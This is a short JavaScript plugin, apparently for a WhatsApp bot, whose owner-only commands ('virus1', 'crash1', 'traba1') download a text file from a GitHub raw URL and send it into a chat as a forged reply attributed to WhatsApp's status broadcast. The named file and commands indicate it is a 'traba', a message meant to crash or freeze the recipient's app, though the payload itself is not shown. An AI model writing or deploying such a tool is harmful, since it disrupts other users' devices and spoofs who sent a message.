import fetch from 'node-fetch'
let handler  = async (m, { conn }) => {
let info = await fetch('https://raw.githubusercontent.com/CyborgC4t/varios-archivos/main/traba1.txt').then(v => v.text());
conn.fakeReply(m.chat, info, '0@s.whatsapp.net', 'XD', 'status@broadcast')}
handler.command = ['virus1', 'c1', 'binario1', 'traba1', 'crash1'] 
handler.rowner = true
handler.fail = null
export default handler
